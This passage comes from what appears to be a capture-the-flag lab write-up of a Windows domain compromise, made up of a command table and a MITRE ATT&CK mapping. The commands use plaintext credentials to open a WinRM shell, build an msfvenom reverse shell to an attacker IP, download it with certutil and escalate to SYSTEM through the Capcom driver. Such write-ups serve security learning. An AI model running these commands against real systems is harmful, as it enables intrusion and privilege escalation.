| `rpcclient -U 'bhult%Welcome@2026' 10.129.2.5` | Authenticated RPC session |
| `enumprinters` | Enumerate printers and descriptions via RPC |
| `netexec smb 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1' -d fabricorp.local` | Validate svc-print credentials |
| `evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'` | Open WinRM shell (single-quote the password) |
| `whoami /priv` | Enumerate current token privileges |
| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -f exe -o shell.exe` | Generate reverse shell payload |
| `certutil -urlcache -f http://10.10.16.36:8000/<file> <dest>` | Download file to target via built-in Windows binary |
| `.\eop.exe CapcomDriver C:\temp\Capcom.sys` | Load Capcom driver via SeLoadDriverPrivilege |
| `.\ex.exe` | Trigger Capcom IOCTL: executes shell.exe as SYSTEM |
| `nc -lvnp 4444` | Catch SYSTEM reverse shell |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Gather Victim Identity Information | T1589.002 | Username harvesting from PaperCut print logs |
| Valid Accounts: Domain Accounts | T1078.002 | Password spray against domain accounts with Fabricorp01 |
| Account Manipulation: Password Reset | T1098 | Remote password change via Kerberos kpasswd (port 464) |
| Remote Services: Windows Remote Management | T1021.006 | WinRM shell via evil-winrm as svc-print |
| Credentials in Files | T1552.001 | Password stored in printer description field |
| Abuse Elevation Control Mechanism | T1068 | SeLoadDriverPrivilege + Capcom.sys kernel exploit → SYSTEM |